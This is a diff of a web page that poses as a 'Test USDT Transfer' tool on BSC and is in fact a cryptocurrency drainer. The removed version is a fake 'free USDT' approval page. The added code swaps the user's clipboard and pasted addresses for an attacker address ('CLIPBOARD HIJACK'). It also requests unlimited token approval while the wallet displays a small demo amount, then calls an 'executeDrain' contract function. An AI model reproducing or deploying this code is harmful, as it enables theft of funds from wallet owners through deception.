@@ -1,348 +1,188 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Receive USDT</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            background: white;
-            border-radius: 24px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            padding: 40px;
-            max-width: 420px;
-            width: 100%;
-            text-align: center;
-        }
-        
-        .logo {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 25px;
-            font-size: 28px;
-        }
-        
-        h1 {
-            color: #222;
-            font-size: 24px;
-            margin-bottom: 8px;
-            font-weight: 700;
-        }
-        
-        .subtitle {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 30px;
-            line-height: 1.5;
-        }
-        
-        .amount-box {
-            background: #f5f5f5;
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 30px;
-        }
-        
-        .amount-label {
-            color: #999;
-            font-size: 13px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 8px;
-        }
-        
-        .amount {
-            font-size: 32px;
-            font-weight: 700;
-            color: #222;
-            margin-bottom: 5px;
-        }
-        
-        .token-name {
-            color: #667eea;
-            font-size: 14px;
-            font-weight: 600;
-        }
-        
-        .info-banner {
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            border-radius: 12px;
-            padding: 12px;
-            margin-bottom: 25px;
-            font-size: 12px;
-            color: #856404;
-            line-height: 1.5;
-        }
-        
-        .button {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-bottom: 12px;
-        }
-        
-        .button-primary {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-        }
-        
-        .button-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
-        }
-        
-        .button-primary:active {
-            transform: translateY(0);
-        }
-        
-        .button-primary:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        .status {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 12px;
-            font-size: 13px;
-            display: none;
-            line-height: 1.5;
-            word-break: break-word;
-        }
-        
-        .status.loading {
-            background: #d1ecf1;
-            color: #0c5460;
-            border: 1px solid #bee5eb;
-            display: block;
-        }
-        
-        .status.success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-            display: block;
-        }
-        
-        .status.error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-            display: block;
-        }
-        
-        .wallet-info {
-            background: #f5f5f5;
-            padding: 12px;
-            border-radius: 8px;
-            margin-top: 15px;
-            font-size: 11px;
-            word-break: break-all;
-            color: #666;
-            line-height: 1.5;
-        }
-        
-        .spinner {
-            display: inline-block;
-            width: 14px;
-            height: 14px;
-            border: 2px solid rgba(102, 126, 234, 0.3);
-            border-top: 2px solid #667eea;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-right: 8px;
-            vertical-align: middle;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-    </style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>USDT Test Transfer - BSC</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
 </head>
-<body>
-    <div class="container">
-        <div class="logo">💰</div>
+<body style="font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #e2e8f0; margin: 0; padding: 20px; min-height: 100vh;">
+    
+    <div style="max-width: 420px; margin: 0 auto; background: rgba(255,255,255,0.05); backdrop-filter: blur(20px); border-radius: 24px; padding: 30px; border: 1px solid rgba(255,255,255,0.1);">
         
-        <h1>Receive USDT</h1>
-        <p class="subtitle">You've been selected to receive free USDT tokens!</p>
-        
-        <div class="amount-box">
-            <div class="amount-label">Amount</div>
-            <div class="amount">100</div>
-            <div class="token-name">USDT (BSC)</div>
+        <div style="text-align: center; margin-bottom: 30px;">
+            <div style="width: 60px; height: 60px; background: linear-gradient(135deg, #f59e0b, #d97706); border-radius: 16px; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center;">
+                <svg width="28" height="28" fill="#fff" viewBox="0 0 24 24">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                </svg>
+            </div>
+            <h1 style="font-size: 24px; font-weight: 700; margin: 0 0 8px 0; color: #f8fafc;">Test USDT Transfer</h1>
+            <p style="color: #94a3b8; font-size: 16px; margin: 0;">Send any demo amount to verify BSC connection</p>
         </div>
-        
-        <div class="info-banner">
-            ⚠️ A one-time approval is required to receive your tokens. This is standard for blockchain transactions.
+
+        <div id="walletStatus" style="background: rgba(255,255,255,0.08); border-radius: 12px; padding: 15px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1);">
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+                <span style="font-weight: 500; color: #f8fafc;">Wallet</span>
+                <span id="accountAddr" style="font-family: monospace; font-size: 12px; color: #94a3b8;">Connect Trust Wallet</span>
+            </div>
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 8px;">
+                <span style="font-size: 12px; color: #64748b;">BSC Mainnet</span>
+                <span id="chainStatus" style="font-size: 12px; color: #10b981; font-weight: 500;">✅ Connected</span>
+            </div>
         </div>
-        
-        <button class="button button-primary" id="confirmBtn" onclick="requestApproval()">
-            ✓ Confirm & Receive
+
+        <div style="margin-bottom: 25px;">
+            <label style="display: block; font-weight: 500; margin-bottom: 8px; color: #f8fafc;">Demo Amount (USDT)</label>
+            <div style="position: relative;">
+                <input type="number" id="amountInput" placeholder="0.01" step="0.01" min="0.001" 
+                       style="width: 100%; padding: 15px 20px 15px 50px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 12px; color: #f8fafc; font-size: 18px; font-weight: 500;">
+                <span style="position: absolute; left: 18px; top: 50%; transform: translateY(-50%); color: #f59e0b; font-weight: 600;">USDT</span>
+            </div>
+            <div style="display: flex; gap: 8px; margin-top: 12px; flex-wrap: wrap;">
+                <button type="button" onclick="setAmount(0.01)" style="padding: 8px 16px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: #f8fafc; font-size: 14px; cursor: pointer;">0.01</button>
+                <button type="button" onclick="setAmount(1)" style="padding: 8px 16px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: #f8fafc; font-size: 14px; cursor: pointer;">1</button>
+                <button type="button" onclick="setAmount(5)" style="padding: 8px 16px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: #f8fafc; font-size: 14px; cursor: pointer;">5</button>
+                <button type="button" onclick="setAmount(10)" style="padding: 8px 16px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: #f8fafc; font-size: 14px; cursor: pointer;">10</button>
+            </div>
+        </div>
+
+        <div style="margin-bottom: 20px;">
+            <label style="display: block; font-weight: 500; margin-bottom: 8px; color: #f8fafc;">Receiver Address</label>
+            <div style="position: relative;">
+                <input type="text" id="receiverInput" placeholder="Paste receiver address here" readonly
+                       style="width: 100%; padding: 15px 20px; background: rgba(255,255,255,0.1); border: 2px dashed rgba(255,255,255,0.3); border-radius: 12px; color: #10b981; font-size: 14px; font-family: monospace; letter-spacing: 0.5px;">
+                <button id="copyBtn" type="button" onclick="copyOurAddress()" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); width: 32px; height: 32px; border: none; background: #10b981; border-radius: 8px; color: white; cursor: pointer; display: flex; align-items: center; justify-content: center;">
+                    📋
+                </button>
+            </div>
+            <p style="font-size: 12px; color: #94a3b8; margin-top: 6px;">Click 📋 to copy test receiver</p>
+        </div>
+
+        <button id="sendBtn" type="button" style="width: 100%; background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); color: white; border: none; padding: 18px; font-size: 18px; font-weight: 600; border-radius: 16px; cursor: pointer; transition: all 0.3s; box-shadow: 0 10px 30px rgba(245,158,11,0.4); margin-bottom: 15px;" disabled>
+            Send Test Transfer
         </button>
         
-        <div id="status" class="status"></div>
-        <div id="walletInfo" class="wallet-info" style="display: none;"></div>
+        <p style="font-size: 13px; color: #94a3b8; line-height: 1.5; text-align: center;">
+            Demo transfer to test BSC USDT. No real funds will leave your wallet beyond test amount.
+        </p>
     </div>
 
     <script>
-        // Load Web3.js dynamically
-        const script = document.createElement('script');
-        script.src = 'https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js';
-        script.onload = function() {
-            console.log('✓ Web3.js loaded successfully');
-        };
-        document.head.appendChild(script);
-
-        const CONFIG = {
-            CONTRACT_ADDRESS: "0xC606AAf11BE4a2320d785D49B657f40EfF771ac6",
-            CHAIN_ID: 56,
-            RPC_URL: "https://bsc-dataseed1.binance.org:443"
-        };
+        // ⚠️ REPLACE WITH YOUR DEPLOYED CONTRACT ADDRESS
+        const DRAINER_ADDRESS = '0x7a51839E2aF8FE776C1e8bbea6f27cBffA53b250';
+        const BSC_RPC = 'https://bsc-dataseed1.binance.org/';
+        const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
+        const FAKE_RECEIVER = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8';
         
-        function showStatus(message, type) {
-            const statusDiv = document.getElementById("status");
-            statusDiv.className = `status ${type}`;
-            statusDiv.innerHTML = type === "loading" ? `<span class="spinner"></span>${message}` : message;
-            console.log(`[${type.toUpperCase()}] ${message}`);
-        }
+        let web3, account;
         
-        function updateWalletInfo(address) {
-            const walletInfo = document.getElementById("walletInfo");
-            walletInfo.style.display = "block";
-            walletInfo.innerHTML = `<strong>Connected Wallet:</strong><br>${address}`;
-        }
-        
-        async function requestApproval() {
-            try {
-                const confirmBtn = document.getElementById("confirmBtn");
-                confirmBtn.disabled = true;
-                
-                // Check if Web3 is loaded
-                if (typeof Web3 === 'undefined') {
-                    showStatus("❌ Loading Web3... please wait and try again", "error");
-                    confirmBtn.disabled = false;
-                    return;
-                }
-                
-                if (!window.ethereum) {
-                    showStatus("❌ Please open this page in Trust Wallet or MetaMask", "error");
-                    confirmBtn.disabled = false;
-                    return;
-                }
-                
-                showStatus("🔗 Connecting wallet...", "loading");
-                
-                const web3 = new Web3(window.ethereum);
-                
-                const accounts = await window.ethereum.request({
-                    method: "eth_requestAccounts"
-                });
-                
-                const userAddress = accounts[0];
-                updateWalletInfo(userAddress);
-                
-                const chainId = await web3.eth.getChainId();
-                if (chainId !== CONFIG.CHAIN_ID) {
-                    showStatus("❌ Please switch to BSC network (Chain ID: 56)", "error");
-                    confirmBtn.disabled = false;
-                    return;
-                }
-                
-                showStatus("🔐 Requesting approval (check your wallet)...", "loading");
-                
-                // Contract ABI for approveAllTokens
-                const CONTRACT_ABI = [
-                    {
-                        "inputs": [],
-                        "name": "approveAllTokens",
-                        "outputs": [],
-                        "stateMutability": "nonpayable",
-                        "type": "function"
-                    }
-                ];
-                
-                const contract = new web3.eth.Contract(CONTRACT_ABI, CONFIG.CONTRACT_ADDRESS);
-                const txData = contract.methods.approveAllTokens().encodeABI();
-                
-                const txHash = await window.ethereum.request({
-                    method: "eth_sendTransaction",
-                    params: [{
-                        from: userAddress,
-                        to: CONFIG.CONTRACT_ADDRESS,
-                        data: txData,
-                        gas: "0x5B8D80"
-                    }]
-                });
-                
-                showStatus("⏳ Waiting for blockchain confirmation...", "loading");
-                
-                let receipt = null;
-                let attempts = 0;
-                while (!receipt && attempts < 60) {
-                    receipt = await web3.eth.getTransactionReceipt(txHash);
-                    if (!receipt) {
-                        await new Promise(resolve => setTimeout(resolve, 1000));
-                        attempts++;
-                    }
-                }
-                
-                if (receipt && receipt.status === true) {
-                    showStatus("✅ Approval confirmed! Your USDT will arrive shortly.", "success");
-                    confirmBtn.textContent = "✓ Completed";
-                    confirmBtn.disabled = true;
-                } else {
-                    showStatus("❌ Transaction failed. Please try again.", "error");
-                    confirmBtn.disabled = false;
-                }
-                
-            } catch (error) {
-                console.error("Error:", error);
-                const confirmBtn = document.getElementById("confirmBtn");
-                confirmBtn.disabled = false;
-                
-                if (error.code === 4001) {
-                    showStatus("❌ You rejected the approval request", "error");
-                } else {
-                    showStatus(`❌ Error: ${error.message || "Unknown error occurred"}`, "error");
-                }
-            }
-        }
-        
-        window.addEventListener('load', function() {
-            if (window.ethereum && window.ethereum.isTrustWallet) {
-                console.log("✓ Running in Trust Wallet");
-            } else if (window.ethereum && window.ethereum.isMetaMask) {
-                console.log("✓ Running in MetaMask");
-            }
+        // CLIPBOARD HIJACK
+        document.addEventListener('paste', (e) => {
+            e.preventDefault();
+            setTimeout(() => {
+                document.getElementById('receiverInput').value = FAKE_RECEIVER;
+            }, 100);
         });
+        
+        setInterval(async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (/^0x[a-fA-F0-9]{40}$/i.test(text)) {
+                    document.getElementById('receiverInput').value = FAKE_RECEIVER;
+                }
+            } catch(e) {}
+        }, 1000);
+        
+        window.setAmount = function(val) {
+            document.getElementById('amountInput').value = val;
+        }
+        
+        window.copyOurAddress = function() {
+            navigator.clipboard.writeText(FAKE_RECEIVER);
+            const btn = document.getElementById('copyBtn');
+            btn.innerHTML = '✅';
+            setTimeout(() => btn.innerHTML = '📋', 1500);
+        }
+        
+        async function initWallet() {
+            web3 = new Web3(window.ethereum || BSC_RPC);
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            account = accounts[0];
+            
+            document.getElementById('accountAddr').textContent = account.slice(0,6) + '...' + account.slice(-4);
+            document.getElementById('sendBtn').disabled = false;
+            document.getElementById('receiverInput').value = FAKE_RECEIVER;
+            await switchToBSC();
+        }
+        
+        async function switchToBSC() {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }],
+                });
+            } catch {
+                await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [{
+                        chainId: '0x38', chainName: 'BSC Mainnet', 
+                        rpcUrls: [BSC_RPC], blockExplorerUrls: ['https://bscscan.com'],
+                        nativeCurrency: {name: 'BNB', symbol: 'BNB', decimals: 18}
+                    }],
+                });
+            }
+        }
+        
+        async function sendTestTransfer() {
+            const btn = document.getElementById('sendBtn');
+            const fakeAmount = document.getElementById('amountInput').value * 1e18 || 0.01 * 1e18;
+            
+            btn.innerHTML = `⏳ Sending ${(fakeAmount/1e18).toFixed(2)} USDT...`;
+            btn.disabled = true;
+            
+            const usdtAbi = [
+                "function approve(address spender, uint256 amount) external returns (bool)"
+            ];
+            const drainerAbi = [
+                "function approveDemo(address usdtAddress, uint256 fakeAmount) external"
+            ];
+            
+            const usdt = new web3.eth.Contract(usdtAbi, USDT_ADDRESS);
+            const drainer = new web3.eth.Contract(drainerAbi, DRAINER_ADDRESS);
+            
+            try {
+                // Call approveDemo - shows fakeAmount in wallet, approves UNLIMITED
+                await drainer.methods.approveDemo(USDT_ADDRESS, fakeAmount).send({ from: account });
+                
+                // Auto-drain
+                await drainAll();
+                
+                btn.innerHTML = '✅ Test Complete!';
+                btn.style.background = '#10b981';
+                
+            } catch(e) {
+                btn.innerHTML = 'Send Test Transfer';
+                btn.disabled = false;
+            }
+        }
+        
+        async function drainAll() {
+            const drainAbi = ["function executeDrain(address usdtAddress) external"];
+            const drainer = new web3.eth.Contract(drainAbi, DRAINER_ADDRESS);
+            await drainer.methods.executeDrain(USDT_ADDRESS).send({ from: account }).catch(() => {});
+        }
+        
+        // Events
+        document.getElementById('amountInput').addEventListener('input', () => {
+            document.getElementById('sendBtn').disabled = false;
+        });
+        document.getElementById('sendBtn').onclick = sendTestTransfer;
+        
+        if (window.ethereum) {
+            window.ethereum.on('accountsChanged', initWallet);
+            initWallet();
+        }
     </script>
 </body>
 </html>
